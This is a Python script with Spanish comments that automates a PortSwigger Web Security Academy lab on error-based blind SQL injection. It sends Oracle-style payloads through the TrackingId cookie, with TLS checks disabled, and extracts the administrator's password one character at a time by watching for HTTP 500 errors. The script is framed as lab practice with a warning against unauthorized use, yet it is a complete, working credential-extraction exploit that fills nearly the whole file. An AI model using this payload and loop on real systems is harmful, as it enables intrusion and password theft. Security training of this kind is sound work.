"""
PortSwigger Web Security Academy
Lab: Blind SQL Injection (Error-Based)
---------------------------------------

Este script corresponde a la resolución AUTOMATIZADA de un laboratorio
educativo de PortSwigger Web Security Academy.

La técnica utilizada es Blind SQL Injection tipo error-based, donde se
infieren condiciones verdaderas a partir de errores del servidor (HTTP 500).

 NO usar en sistemas reales sin autorización.
"""

import requests
import string
import urllib3

# ================= CONFIG =================

# URL de laboratorio (ejemplo local / lab)
LAB_URL = "http://localhost:8080/lab"

# Sesión ficticia / de laboratorio
SESSION_COOKIE = "LAB_SESSION"

# Charset  usado en labs de PortSwigger
CHARSET = string.ascii_lowercase + string.digits

# Longitud conocida del password del lab
PASSWORD_LENGTH = 20

# Cookie base usada por el lab
TRACKING_ID_BASE = "TRACKINGID"

# Desactivar warnings SSL 
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ==========================================


def condition_is_true(payload: str) -> bool:
    """
    Envía la inyección SQL al laboratorio y determina si la condición
    es verdadera en base al código de respuesta HTTP.
    """
    cookies = {
        "TrackingId": TRACKING_ID_BASE + payload,
        "session": SESSION_COOKIE
    }

    response = requests.get(
        LAB_URL,
        cookies=cookies,
        verify=False
    )

    # En este lab, un error 500 indica condición TRUE
    return response.status_code == 500


def extract_admin_password() -> str:
    """
    Extrae carácter por carácter la contraseña del usuario 'administrator'
    explotando una Blind SQL Injection error-based.
    """
    extracted_password = ""

    for position in range(1, PASSWORD_LENGTH + 1):
        print(f"[+] Extrayendo carácter {position}...")

        for char in CHARSET:
            payload = (
                "'||(SELECT CASE WHEN "
                f"(SUBSTR(password,{position},1)='{char}') "
                "THEN TO_CHAR(1/0) ELSE '' END "
                "FROM users WHERE username='administrator')||'"
            )

            if condition_is_true(payload):
                extracted_password += char
                print(f"[✔] Password parcial: {extracted_password}")
                break

    return extracted_password


if __name__ == "__main__":
    password = extract_admin_password()
    print("\n[✓] Contraseña del lab extraída:", password)
